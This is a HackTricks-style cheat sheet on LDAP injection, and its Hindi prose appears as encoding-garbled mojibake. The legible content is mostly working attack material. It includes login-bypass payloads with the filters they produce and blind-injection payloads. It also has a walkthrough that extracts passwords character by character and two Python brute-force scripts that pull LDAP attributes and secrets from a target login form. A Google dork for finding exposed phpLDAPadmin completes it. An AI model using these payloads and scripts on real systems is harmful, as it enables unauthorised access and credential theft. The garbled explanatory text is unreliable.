# LDAP Injection

## LDAP Injection

<details>

<summary><strong>‡§ú‡§æ‡§®‡•á‡§Ç AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§∏‡•á ‡§π‡•Ä‡§∞‡•ã ‡§§‡§ï</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ‡§ï‡•á ‡§∏‡§æ‡§•!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•Ä ‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® **HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®‡•ç‡§∏ ‡§¶‡•á‡§ñ‡•á‡§Ç**](https://github.com/sponsors/carlospolop)!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS ‡§î‡§∞ HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* ‡§π‡§Æ‡§æ‡§∞‡•á ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§ï‡§≤‡•á‡§ï‡•ç‡§∂‡§® [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ñ‡•ã‡§ú‡•á‡§Ç
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§Ö‡§™‡§®‡•á ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç‡•§

</details>

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

‡§Ø‡§¶‡§ø ‡§Ü‡§™ **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡§∞‡§ø‡§Ø‡§∞** ‡§Æ‡•á‡§Ç ‡§∞‡•Å‡§ö‡§ø ‡§∞‡§ñ‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§Ö‡§®‡§π‡•à‡§ï‡•á‡§¨‡§≤ ‡§ï‡•ã ‡§π‡•à‡§ï ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç - **‡§π‡§Æ ‡§≠‡§∞‡•ç‡§§‡•Ä ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç!** (_‡§´‡•ç‡§≤‡•Ç‡§è‡§Ç‡§ü ‡§™‡•ã‡§≤‡§ø‡§∂ ‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§î‡§∞ ‡§¨‡•ã‡§≤‡•Ä ‡§ú‡§æ‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è_).

{% embed url="https://www.stmcyber.com/careers" %}

## LDAP Injection

### **LDAP**

**‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§ú‡§æ‡§®‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø LDAP ‡§ï‡•ç‡§Ø‡§æ ‡§π‡•à ‡§§‡•ã ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§™‡•É‡§∑‡•ç‡§† ‡§™‡§∞ ‡§ú‡§æ‡§è‡§Ç:**

{% content-ref url="../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

**LDAP Injection** ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ ‡§π‡•à ‡§ú‡•ã ‡§µ‡•á‡§¨ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§≤‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§á‡§®‡§™‡•Å‡§ü ‡§∏‡•á LDAP ‡§µ‡§ï‡•ç‡§§‡§µ‡•ç‡§Ø ‡§¨‡§®‡§æ‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§Ø‡§π ‡§â‡§∏ ‡§∏‡§Æ‡§Ø ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡§¨ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® **‡§á‡§®‡§™‡•Å‡§ü ‡§ï‡•ã ‡§∏‡§π‡•Ä ‡§¢‡§Ç‡§ó ‡§∏‡•á ‡§∏‡•à‡§®‡§ø‡§ü‡§æ‡§á‡§ú‡§º ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡§æ**, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§π‡§Æ‡§≤‡§æ‡§µ‡§æ‡§¶‡•Ä **‡§∏‡•ç‡§•‡§æ‡§®‡•Ä‡§Ø ‡§™‡•ç‡§∞‡•â‡§ï‡•ç‡§∏‡•Ä ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á LDAP ‡§µ‡§ï‡•ç‡§§‡§µ‡•ç‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§™‡§∞‡§ø‡§µ‡§∞‡•ç‡§§‡§ø‡§§** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§ú‡•ã ‡§Ö‡§®‡§ß‡§ø‡§ï‡•É‡§§ ‡§™‡§π‡•Å‡§Ç‡§ö ‡§Ø‡§æ ‡§°‡•á‡§ü‡§æ ‡§™‡§∞‡§ø‡§µ‡§∞‡•ç‡§§‡§® ‡§ï‡•Ä ‡§ì‡§∞ ‡§≤‡•á ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

{% file src="../.gitbook/assets/EN-Blackhat-Europe-2008-LDAP-Injection-Blind-LDAP-Injection.pdf" %}

**‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞** = ( filtercomp )\
**‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞‡§ï‡•â‡§Æ‡•ç‡§™** = and / or / not / item\
**‡§è‡§Ç‡§°** = & filterlist\
**‡§Ø‡§æ** = |filterlist\
**‡§®‡•â‡§ü** = ! filter\
**‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞‡§≤‡§ø‡§∏‡•ç‡§ü** = 1\*filter\
**‡§Ü‡§á‡§ü‡§Æ**= ‡§∏‡§∞‡§≤ / ‡§â‡§™‡§∏‡•ç‡§•‡§ø‡§§ / ‡§â‡§™‡§∏‡•ç‡§•‡§ø‡§§‡§Ö‡§Ç‡§∂\
**‡§∏‡§∞‡§≤** = ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§™‡•ç‡§∞‡§§‡§ø‡§ú‡•ç‡§û‡§æ‡§®‡§Æ‡•Ç‡§≤‡•ç‡§Ø\
**‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞** = _'=' / '\~=' / '>=' / '<='_\
**‡§™‡•ç‡§∞‡•á‡§ú‡•á‡§Ç‡§ü** = ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü = \*\
**‡§∏‡§¨‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó** = ‡§è‡§ü‡•ç‡§∞‡§ø‡§¨‡•ç‡§Ø‡•Ç‡§ü ‚Äù=‚Äù \[‡§Ü‡§∞‡§Ç‡§≠‡§ø‡§ï] \* \[‡§Ö‡§Ç‡§§‡§ø‡§Æ]\
**‡§Ü‡§∞‡§Ç‡§≠‡§ø‡§ï** = ‡§™‡•ç‡§∞‡§§‡§ø‡§ú‡•ç‡§û‡§æ‡§®‡§Æ‡•Ç‡§≤‡•ç‡§Ø\
**‡§Ö‡§Ç‡§§‡§ø‡§Æ** = ‡§™‡•ç‡§∞‡§§‡§ø‡§ú‡•ç‡§û‡§æ‡§®‡§Æ‡•Ç‡§≤‡•ç‡§Ø\
**(&)** = ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§∏‡§§‡•ç‡§Ø\
**(|)** = ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§ù‡•Ç‡§†

‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è:\
`(&(!(objectClass=Impresoras))(uid=s*))`\
`(&(objectClass=user)(uid=*))`

‡§Ü‡§™ ‡§°‡•á‡§ü‡§æ‡§¨‡•á‡§∏ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§î‡§∞ ‡§á‡§∏‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§π‡•ã ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§

**OpenLDAP**: ‡§Ø‡§¶‡§ø 2 ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§™‡§π‡•Å‡§Ç‡§ö‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§ï‡•á‡§µ‡§≤ ‡§™‡§π‡§≤‡§æ ‡§è‡§ï ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§æ‡§®‡•ç‡§µ‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§\
**ADAM ‡§Ø‡§æ Microsoft LDS**: 2 ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§µ‡•á ‡§è‡§ï ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§´‡•á‡§Ç‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§\
**SunOne Directory Server 5.0**: ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§æ‡§®‡•ç‡§µ‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

**‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§ï‡•ã ‡§∏‡§π‡•Ä ‡§∏‡§ø‡§Ç‡§ü‡•à‡§ï‡•ç‡§∏ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§≠‡•á‡§ú‡§®‡§æ ‡§¨‡§π‡•Å‡§§ ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§π‡•à ‡§Ø‡§æ ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§´‡•á‡§Ç‡§ï‡•Ä ‡§ú‡§æ‡§è‡§ó‡•Ä‡•§ ‡§¨‡•á‡§π‡§§‡§∞ ‡§π‡•à ‡§ï‡•á‡§µ‡§≤ 1 ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§≠‡•á‡§ú‡§®‡§æ‡•§**

‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§ï‡•ã ‡§á‡§∏ ‡§™‡•ç‡§∞‡§æ‡§∞‡§Ç‡§≠ ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è: `&` ‡§Ø‡§æ `|`\
‡§â‡§¶‡§æ‡§π‡§∞‡§£: `(&(directory=val1)(folder=public))`

`(&(objectClass=VALUE1)(type=Epson*))`\
`VALUE1 = *)(ObjectClass=*))(&(objectClass=void`

‡§´‡§ø‡§∞: `(&(objectClass=`**`*)(ObjectClass=*))`** ‡§™‡§π‡§≤‡§æ ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§π‡•ã‡§ó‡§æ (‡§ú‡•ã ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§æ‡§®‡•ç‡§µ‡§ø‡§§ ‡§π‡•ã‡§ó‡§æ)‡•§

### ‡§≤‡•â‡§ó‡§ø‡§® ‡§¨‡§æ‡§á‡§™‡§æ‡§∏

LDAP ‡§ï‡§à ‡§™‡•ç‡§∞‡§æ‡§∞‡•Ç‡§™ ‡§∏‡§Æ‡§∞‡§ï ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§∏‡•ç‡§ü‡•ã‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à: ‡§∏‡•ç‡§™‡§∑‡•ç‡§ü, md5, smd5, sh1, sha, crypt‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ø‡§π ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§Æ‡•á‡§Ç ‡§ú‡•ã ‡§ï‡•Å‡§õ ‡§≠‡•Ä ‡§°‡§æ‡§≤‡•á‡§Ç, ‡§µ‡§π ‡§π‡•à‡§∂ ‡§π‡•ã‡•§
```bash
user=*
password=*
--> (&(user=*)(password=*))
# The asterisks are great in LDAPi
```

```bash
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))
```

```bash
user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))
```

```bash
user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
```

```bash
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed
```

```bash
user=admin)(&)
password=pwd
--> (&(user=admin)(&))(password=pwd) #Can through an error
```

```bash
username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) ‚Äî> As (|) is FALSE then the user is admin and the password check is True.
```

```bash
username=*
password=*)(&
--> (&(user=*)(password=*)(&))
```

```bash
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))
```
#### ‡§∏‡•Ç‡§ö‡•Ä

* [LDAP\_FUZZ](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_FUZZ.txt)
* [LDAP ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ‡§è‡§Å](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt)
* [LDAP PosixAccount ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ‡§è‡§Å](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)

### ‡§Ö‡§Ç‡§ß‡§æ LDAP ‡§Ö‡§Ç‡§¶‡§∞‡§ò‡•Å‡§∏‡•ç‡§§‡•Ä

‡§Ü‡§™ ‡§Ø‡§π‡§æ‡§Å ‡§è‡§ï ‡§Ö‡§Ç‡§ß‡§æ LDAP ‡§Ö‡§Ç‡§¶‡§∞‡§ò‡•Å‡§∏‡•ç‡§§‡•Ä ‡§ï‡•Ä ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§®‡§æ ‡§ï‡•Ä ‡§™‡•Å‡§∑‡•ç‡§ü‡§ø ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ù‡•Ç‡§†‡§æ ‡§Ø‡§æ ‡§∏‡§ö‡•ç‡§ö‡§æ ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§è‡§Å ‡§¨‡§≤ ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§ï‡§ø‡§∏‡•Ä ‡§°‡•á‡§ü‡§æ ‡§ï‡•Ä ‡§µ‡§æ‡§™‡§∏‡•Ä ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```bash
#This will result on True, so some information will be shown
Payload: *)(objectClass=*))(&objectClass=void
Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))
```

```bash
#This will result on True, so no information will be returned or shown
Payload: void)(objectClass=void))(&objectClass=void
Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
```
#### ‡§°‡§Ç‡§™ ‡§°‡•á‡§ü‡§æ

‡§Ü‡§™ ‡§è‡§∏‡•ç‡§ï‡•Ä ‡§Ö‡§ï‡•ç‡§∑‡§∞, ‡§Ö‡§Ç‡§ï ‡§î‡§∞ ‡§™‡•ç‡§∞‡§§‡•Ä‡§ï‡•ã‡§Ç ‡§™‡§∞ ‡§ö‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```bash
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
```
### ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•ç‡§∏
#### **Discover valid LDAP fields**

LDAP objects **contains by default several attributes** that could be used to **save information**. You can try to **brute-force all of them to extract that info.** You can find a list of [**default LDAP attributes here**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt).
```python
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
value = ""
finish = False
while not finish:
for char in alphabet: #In each possition test each possible printable char
query = f"*)({attribute}={value}{char}*"
data = {'login':query, 'password':'bla'}
r = requests.post(url, data=data, proxies=proxy)
sys.stdout.write(f"\r{attribute}: {value}{char}")
#sleep(0.5) #Avoid brute-force bans
if "Cannot login" in r.text:
value += str(char)
break

if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
finish = True
print()
```
#### **‡§µ‡§ø‡§∂‡•á‡§∑ ‡§¨‡•ç‡§≤‡§æ‡§á‡§Ç‡§° LDAP ‡§á‡§®‡•ç‡§ú‡•á‡§ï‡•ç‡§∂‡§® (‡§¨‡§ø‡§®‡§æ "\*")**
```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
print("[i] Looking for number " + str(i))
for char in alphabet:
r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
if ("TRUE CONDITION" in r.text):
flag += char
print("[+] Flag: " + flag)
break
```
### ‡§ó‡•Ç‡§ó‡§≤ ‡§°‡•â‡§∞‡•ç‡§ï‡•ç‡§∏
```bash
intitle:"phpLDAPadmin" inurl:cmd.php
```
### ‡§Ö‡§ß‡§ø‡§ï Payloads

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

‡§Ø‡§¶‡§ø ‡§Ü‡§™ **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡§∞‡§ø‡§Ø‡§∞** ‡§Æ‡•á‡§Ç ‡§∞‡•Å‡§ö‡§ø ‡§∞‡§ñ‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§Ö‡§®‡§π‡•à‡§ï‡•á‡§¨‡§≤ ‡§ï‡•ã ‡§π‡•à‡§ï ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç - **‡§π‡§Æ ‡§≠‡§∞‡•ç‡§§‡•Ä ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç!** (_‡§´‡•ç‡§≤‡•Ç‡§è‡§Ç‡§ü ‡§™‡•ã‡§≤‡§ø‡§∂ ‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§î‡§∞ ‡§¨‡•ã‡§≤‡•Ä ‡§ú‡§æ‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>‡§ú‡•Ä‡§∞‡•ã ‡§∏‡•á ‡§π‡•Ä‡§∞‡•ã ‡§§‡§ï AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ‡§ï‡•á ‡§∏‡§æ‡§•!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•Ä **‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®‡•ç‡§∏**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS & HackTricks swag ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç**](https://peass.creator-spring.com)
* ‡§π‡§Æ‡§æ‡§∞‡•á ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§ï‡§≤‡•á‡§ï‡•ç‡§∂‡§®, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ñ‡•ã‡§ú‡•á‡§Ç
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§Ö‡§™‡§®‡•á ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç, HackTricks** ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á‡•§

</details>
